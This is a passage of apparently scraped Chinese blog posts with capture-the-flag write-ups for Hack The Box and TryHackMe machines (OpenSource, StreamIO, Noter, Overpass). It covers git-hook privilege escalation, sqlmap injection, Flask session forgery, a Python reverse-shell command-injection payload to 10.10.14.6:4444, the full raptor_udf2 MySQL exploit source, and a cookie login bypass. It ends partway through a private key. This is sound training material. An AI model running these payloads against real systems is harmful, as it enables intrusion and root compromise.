ssh-key 直接去尝试连接 ssh ┌──(root💀kali)-[~/Desktop] └─# ssh dev01@10.10.11.164 -i id_rsa The authenticity of host &#39;10.10.11.164 (10.10.11.164)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.164&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Jun 7 03:07:46 UTC 2022 System load: 0.0 Processes: 241 Usage of /: 75.0% of 3.48GB Users logged in: 0 Memory usage: 22% IP address for eth0: 10.10.11.164 Swap usage: 0% IP address for docker0: 172.17.0.1 16 updates can be applied immediately. 9 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Last login: Mon May 16 13:13:33 2022 from 10.10.14.23 dev01@opensource:~$ whoami&amp;&amp;id dev01 uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) 成功逃逸出来 dev01@opensource:~$ ls user.txt dev01@opensource:~$ cat user.txt 80fc1f5f07080181febb1098b2c7070c 成功拿到 user 权限的 flag 文件 权限提升dev01@opensource:~$ ls -la total 44 drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 . drwxr-xr-x 4 root root 4096 May 16 12:51 .. lrwxrwxrwx 1 dev01 dev01 9 Mar 23 01:21 .bash_history -&gt; /dev/null -rw-r--r-- 1 dev01 dev01 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dev01 dev01 3771 Apr 4 2018 .bashrc drwx------ 2 dev01 dev01 4096 May 4 16:35 .cache drwxrwxr-x 8 dev01 dev01 4096 Jun 7 03:09 .git drwx------ 3 dev01 dev01 4096 May 4 16:35 .gnupg drwxrwxr-x 3 dev01 dev01 4096 May 4 16:35 .local -rw-r--r-- 1 dev01 dev01 807 Apr 4 2018 .profile drwxr-xr-x 2 dev01 dev01 4096 May 4 16:35 .ssh -rw-r----- 1 root dev01 33 Jun 7 01:50 user.txt dev01@opensource:~$ cd .git dev01@opensource:~/.git$ ls -la total 56 drwxrwxr-x 8 dev01 dev01 4096 Jun 7 03:09 . drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .. drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 branches -rw-r--r-- 1 dev01 dev01 22 Jun 7 03:09 COMMIT_EDITMSG -rw-rw-r-- 1 dev01 dev01 269 Jun 7 03:08 config -rw-rw-r-- 1 dev01 dev01 73 Mar 23 01:18 description -rw-rw-r-- 1 dev01 dev01 117 Mar 23 01:19 FETCH_HEAD -rw-r--r-- 1 dev01 dev01 21 May 16 12:50 HEAD drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 hooks -rw-r--r-- 1 root root 845 Jun 7 01:51 index drwxrwxr-x 2 dev01 dev01 4096 May 4 16:35 info drwxr-xr-x 3 dev01 dev01 4096 May 4 16:35 logs drwxrwxr-x 44 dev01 dev01 4096 Jun 7 01:51 objects drwxrwxr-x 5 dev01 dev01 4096 May 4 16:35 refs 这边可以根据之前的文件来猜测，可能存在 .git&#x2F;hooks 文件夹，查看了一下确实存在，我们进去看看 dev01@opensource:~/.git/hooks$ cat pre-commit.sample #!/bin/sh # # An example hook script to verify what is about to be committed. # Called by &quot;git commit&quot; with no arguments. The hook should # exit with non-zero status after issuing an appropriate message if # it wants to stop the commit. # # To enable this hook, rename this file to &quot;pre-commit&quot;. if git rev-parse --verify HEAD &gt;/dev/null 2&gt;&amp;1 then against=HEAD else # Initial commit: diff against an empty tree object against=4b825dc642cb6eb9a060e54bf8d69288fbee4904 fi # If you want to allow non-ASCII filenames set this variable to true. allownonascii=$(git config --bool hooks.allownonascii) # Redirect output to stderr. exec 1&gt;&amp;2 # Cross platform projects tend to avoid non-ASCII filenames; prevent # them from being added to the repository. We exploit the fact that the # printable range starts at the space character and ends with tilde. if [ &quot;$allownonascii&quot; != &quot;true&quot; ] &amp;&amp; # Note that the use of brackets around a tr range is ok here, (it&#39;s # even required, for portability to Solaris 10&#39;s /usr/bin/tr), since # the square bracket bytes happen to fall in the designated range. test $(git diff --cached --name-only --diff-filter=A -z $against | LC_ALL=C tr -d &#39;[ -~]\\0&#39; | wc -c) != 0 then cat &lt;&lt;\\EOF Error: Attempt to add a non-ASCII file name. This can cause problems if you want to work with people on other platforms. To be portable it is advisable to rename the file. If you know what you are doing you can disable this check using: git config hooks.allownonascii true EOF exit 1 fi # If there are whitespace errors, print the offending file names and fail. exec git diff-index --check --cached $against -- pre-commit.sample 文件看起来很有希望啊？让我们稍稍的修改一下 我们将 chmod u+s &#x2F;bin&#x2F;bash 添加到 pre-commit.sample 的 #!&#x2F;bn&#x2F;bash 一行下 接着将 pre-commit.sample 文件名改为 pre-commit dev01@opensource:~/.git/hooks$ /bin/bash -p bash-4.4# whoami&amp;&amp;id root uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01) 然后进行利用，成功踢拳道 root 权限 bash-4.4# cat /root/root.txt b6936fa688d43c9d1cc68e6c0fd1971e 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"StreamIO - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-StreamIO","date":"2022-06-04T11:38:36.000Z","updated":"2023-06-17T02:32:37.000Z","comments":true,"path":"2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/","link":"","permalink":"http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/","excerpt":"","text":"Hackthebox - StreamIO靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 13:41 CST Nmap scan report for 10.10.11.158 Host is up (0.69s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-06-17 12:42:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name) 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | tls-alpn: |_ http/1.1 |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found |_ssl-date: 2022-06-17T12:44:06+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=streamIO/countryName=EU | Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb | Not valid before: 2022-02-22T07:03:28 |_Not valid after: 2022-03-24T07:03:28 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49701/tcp open msrpc Microsoft Windows RPC 49964/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-time: | date: 2022-06-17T12:43:25 |_ start_date: N/A TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 831.08 ms 10.10.16.1 2 831.12 ms 10.10.11.158 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 184.57 seconds Http 80 端口就是一个 iis 默认页面，没什么东西 Https https 页面会报错，我往回看了一下，有两个 DNS DNS:streamIO.htb, DNS:watch.streamIO.htb 我们给添加到 hosts 中 echo 10.10.11.158 streamIO.htb watch.streamIO.htb &gt;&gt; /etc/hosts 然后去访问一下 https://streamIO.htb/ 这边有一个登录页面 猜测可能是有注入，去尝试一下 漏洞利用SQL 注入┌──(root💀lucifiel)-[~/Desktop] └─# sqlmap -u &quot;https://streamIO.htb/login.php&quot; --method POST --data &quot;username=FUZZ&amp;password=FUZZ&quot; --dbs available databases [5]: [*] model [*] msdb [*] STREAMIO [*] streamio_backup [*] tempdb 确实有个时间注入，不过是真的慢，我就直接放结果了 ┌──(root💀lucifiel)-[~/Desktop] └─# sqlmap -u &quot;https://streamIO.htb/login.php&quot; --method POST --data &quot;username=FUZZ&amp;password=FUZZ&quot; --batch -D STREAMIO -T users -C username,password --dump","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Noter - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Noter","date":"2022-05-22T11:38:36.000Z","updated":"2023-06-13T03:47:56.000Z","comments":true,"path":"2022/05/22/Hackthebox/Medium/Hackthebox-Noter/","link":"","permalink":"http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/","excerpt":"","text":"Hackthebox - Noter靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-22 02:50 EDT Nmap scan report for 10.10.11.160 Host is up (0.12s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) | 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=5/22%OT=21%CT=1%CU=41426%PV=Y%DS=2%DC=T%G=Y%TM=6289DD5 OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 126.10 ms 10.10.14.1 2 126.30 ms 10.10.11.160 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds Http 正如名字记录，这是一台笔记相关的靶机 这里用 Wappalyzer 可以看到是一台 Flask 相关的靶机 直接登陆提示的是 Invalid credentials ，这里也有注册口，先去注册个账号看看 注册一个账号后，使用错误的密码登陆，提示的是 Invalid login ，那就意味着用户名可以被爆破，在抓继续查看的同时，我们先去爆破用户名看看 使用用户名字典 &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;cirt-default-usernames.txt，然后使用 Burp 抓包进行爆破 最后得到了一个用户名 blue 然后使用我们注册的账户进行登陆 倒是没看到什么有用的东西 cookie 处 发现了一个 JWT Token，拿去解密 漏洞利用 https://github.com/Paradoxis/Flask-Unsign 既然确定是 Flask 并且有 JWT 了，那就先暴力破解 JWT Token 的密钥吧 ┌──(root💀kali)-[~/Desktop/Flask-Unsign-master] └─# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie &#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibHVjaWZpZWwifQ.YonkHw.yXozzyS_yg75iFARMutm6Be2D64&#39; [*] Session decodes to: {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;lucifiel&#39;} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 17152 attempts b&#39;secret123&#39; 接着使用我们得到的密钥 secret123 和用户名 blue 去生成一段 JWT Token 吧 ┌──(root💀kali)-[~/Desktop/Flask-Unsign-master] └─# flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;blue&#39;}&quot; --secret &#39;secret123&#39; eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yonkfg.c45FeiSpfEgpBTGIvOACAJVXKbk 接着替换我们的 JWT Token 后，刷新页面 我们成功进入了 blue 用户的后台 我们注意到，在这篇文章里，ftp_admin 用户有一份笔记，大意是说我们可以访问 FTP，并且给了我们一个账号密码 username = blue password = blue@Noter! 去登陆 ┌──(root💀kali)-[~/Desktop] └─# ftp 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:root): blue 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. 成功登陆了 ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files -rw-r--r-- 1 1002 1002 12569 Dec 24 20:59 policy.pdf 226 Directory send OK. ftp&gt; get policy.pdf local: policy.pdf remote: policy.pdf 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for policy.pdf (12569 bytes). 226 Transfer complete. 12569 bytes received in 0.00 secs (54.9850 MB/s) 这里看到有一个名为 policy.pdf 的文件，给下载下来 在创建密码的第四条提到了 Default user-password generated by the application is in the format of &quot;username@site_name!&quot; (This applies to all your applications) 这里的意思是，默认用户密码的格式是 username@sie_name! 按照我们当前的情况，并且管理员是 ftp_admin 的情况下，那就得到了一个账号密码 username = ftp_admin password = ftp_admin@Noter! 继续登陆 ftp ┌──(root💀kali)-[~/Desktop] └─# ftp 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:root): ftp_admin 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. 登陆成功 ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 05:52 app_backup_1638395546.zip 226 Directory send OK. ftp&gt; get app_backup_1635803546.zip local: app_backup_1635803546.zip remote: app_backup_1635803546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes). 226 Transfer complete. 25559 bytes received in 0.13 secs (193.4986 kB/s) ftp&gt; get app_backup_1638395546.zip local: app_backup_1638395546.zip remote: app_backup_1638395546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes). 226 Transfer complete. 26298 bytes received in 0.13 secs (193.9745 kB/s) 这里有两个 zip 文件，我们下载解压后，发现里面的结构是一样的，进行一下比较 ┌──(root💀kali)-[~/Desktop] └─# diff ./1/app.py ./2/app.py 17,18c17,18 &lt; app.config[&#39;MYSQL_USER&#39;] = &#39;root&#39; &lt; app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;Nildogg36&#39; 我们得到了一个 mysql 的账号密码 username = root password = Nildogg36 rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{note[&#39;body&#39;]}&#39; {rand_int}&quot; subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) 在 app_backup_1638395546.zip 的 app.py 的第 283 行，我们看到了一个 RCE 漏洞 填入我们的 Shell 语句 url = request.form[&#39;url&#39;] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{r.text.strip()}&#39; {rand_int}&quot; subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) 通过这部分代码，我们构造了一段 POC 我们创建一个名为 exploit.md 的文件 &#39;;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.6&quot;,4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39; # &#39; 接着使用 NC 监听一个端口 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... 然后使用 python3 打开一个 http 服务 ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 然后去页面上访问一下 填入我们的 shell 地址，然后执行 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.11.160] 53994 $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; svc@noter:~/app/web$ whoami&amp;&amp;id whoami&amp;&amp;id svc uid=1001(svc) gid=1001(svc) groups=1001(svc) 成功拿到一个 user 权限 svc@noter:/home$ cat /home/svc/user.txt cat /home/svc/user.txt ed6e3a8ea6c35a17e3d63a425cb95c11 成功拿到一个 user 权限的 flag 文件 权限提升我们之前获得过一个 mysql 的凭证，这应该是一个提示，去看看进程 svc@noter:~/app/web$ mysql -V mysql -V mysql Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 咱们知道了 mysql 的版本，然后搜索一下 mysql udf ┌──(root💀kali)-[~/Desktop] └─# searchsploit mysql udf ------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------ --------------------------------- MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1) | linux/local/1181.c MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) | linux/local/1518.c MySQL 4/5/6 - UDF for Command Execution | linux/local/7856.txt ------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results 应该是第二个了 ┌──(root💀kali)-[~/Desktop] └─# locate linux/local/1518.c /usr/share/exploitdb/exploits/linux/local/1518.c 把 exp 给保存到桌面 /* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol * that corresponds to the main xxx() function. These auxiliary symbols * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and * xxx_add() functions&quot;. -- User Defined Functions Security Precautions * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;)); * mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;; * mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name | ret | dl | type | * +-----------+-----+----------------+----------+ * | do_system | 2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT}; typedef struct st_udf_args { unsigned int arg_count; // number of arguments enum Item_result *arg_type; // pointer to item_result char **args; // pointer to arguments unsigned long *lengths; // length of string args char *maybe_null; // 1 for maybe_null args } UDF_ARGS; typedef struct st_udf_init { char maybe_null; // 1 if func can return NULL unsigned int decimals; // for real functions unsigned long max_length; // for string functions char *ptr; // free ptr for func data char const_item; // 0 if result is constant } UDF_INIT; int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) { if (args-&gt;arg_count != 1) return(0); system(args-&gt;args[0]); return(0); } char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) { return(0); } // milw0rm.com [2006-02-20] 很完善的 exp 啊，还给了教程 我们把 exp 上传上去 然后按照 exp 里的教程，一步步执行 $ cd /tmp $ gcc -g -c raptor_udf2.c $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o $ raptor_udf2.so raptor_udf2.o -lc $ mysql -u root -p # root:Nildogg36 MariaDB [(none)]&gt; use mysql; MariaDB [mysql]&gt; create table foo(line blob); MariaDB [mysql]&gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;)); MariaDB [mysql]&gt; show variables like &#39;%plugin%&#39;; MariaDB [mysql]&gt; select * from foo into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;; MariaDB [mysql]&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;; MariaDB [mysql]&gt; select * from mysql.func; MariaDB [mysql]&gt; select do_system(&#39;cat /root/root.txt &gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#39;); MariaDB [mysql]&gt; \\! sh $ cat /tmp/flag.txt 然后就可以得到 root 权限的 flag 文件了","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Overpass - TryHackMe","slug":"TryHackMe/TryHackMe-Overpass","date":"2022-05-05T00:39:12.000Z","updated":"2023-06-13T03:55:50.000Z","comments":true,"path":"2022/05/05/TryHackMe/TryHackMe-Overpass/","link":"","permalink":"http://www.lucifiel.com/2022/05/05/TryHackMe/TryHackMe-Overpass/","excerpt":"","text":"靶场介绍当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次完美的商业成功！ 这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？ 更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。 靶场地址https://tryhackme.com/room/overpass 信息收集Nmap┌──(root💀lucifiel)-[~] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST Nmap scan report for 10.10.29.27 Host is up (0.15s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) |_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11 OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN( OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 151.63 ms 10.18.0.1 2 152.12 ms 10.10.29.27 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds HTTP 没什么有用的东西，去 FUZZ 一下 FUZZ┌──(root💀kali)-[~/Desktop] └─# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.29.27/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/05/05 07:54:43 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 0] [--&gt; img/] /downloads (Status: 301) [Size: 0] [--&gt; downloads/] /aboutus (Status: 301) [Size: 0] [--&gt; aboutus/] /admin (Status: 301) [Size: 42] [--&gt; /admin/] /css (Status: 301) [Size: 0] [--&gt; css/] 有一个 &#x2F;admin 目录，进去看一下 一个登陆页面，使用弱口令没有进去，看一下源代码 在页面 http://10.10.29.27/login.js 中找到了一句 Cookies.set(&quot;SessionToken&quot;,statusOrCookie) 同时在 http://10.10.29.27/main.js 还有一个内容 console.log(&quot;Hello, World!&quot;) 这里应该是 Cookie 设置绕过 漏洞利用按 F12 打开控制台 这里也确实输出了 “Hello, World” 这里修改我们的 Payload Cookies.set(&quot;SessionToken&quot;, &quot;&quot;) 在控制台输入以后，刷新 直接绕过了登陆机制，拿到了用户 james 的 sshkey -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337 LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT 